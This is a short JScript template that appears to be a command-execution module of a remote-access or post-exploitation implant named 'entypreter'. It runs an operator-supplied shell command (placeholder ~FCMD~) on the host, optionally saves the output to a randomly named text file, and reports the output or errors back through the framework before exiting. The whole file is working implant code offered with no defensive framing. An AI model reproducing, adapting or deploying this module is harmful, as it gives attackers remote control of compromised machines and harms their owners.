try
{
    var readout = ~OUTPUT~;
    if (readout)
    {
        var output = entypreter.shell.exec("~FCMD~", "~FDIRECTORY~\\"+entypreter.uuid()+".txt");
    }
    else
    {
        var output = "";
        entypreter.shell.run("~FCMD~");
        entypreter.work.report();
    }

    if (output != "")
    {
        entypreter.work.report(output);
    }
}
catch (e)
{
    entypreter.work.error(e);
}

entypreter.exit();
